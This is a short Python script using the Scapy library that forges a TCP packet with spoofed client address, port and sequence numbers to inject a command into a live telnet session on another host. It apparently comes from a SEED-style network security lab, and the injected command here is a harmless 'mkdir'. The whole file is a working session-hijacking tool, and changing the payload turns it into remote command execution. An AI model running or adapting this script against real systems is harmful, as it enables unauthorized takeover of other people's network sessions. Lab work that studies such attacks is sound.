#!/usr/bin/python


from scapy.all import *


client_IP = "10.0.2.6"
server_IP = "10.0.2.4"

telnet_port = 23
target_port = 44070

flag = "A" # ACK bit

seq_num = 2273799958
ack_num = 2561829142

# create ip packet
ip = IP(src=client_IP, dst=server_IP)

# create tcp packet
tcp = TCP(sport=target_port, dport=telnet_port, flags=flag, seq=seq_num, ack=ack_num)

# create malicious command data
malicious_command = "mkdir /home/seed/testing\r\n"
data = malicious_command

# construct the packet
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)
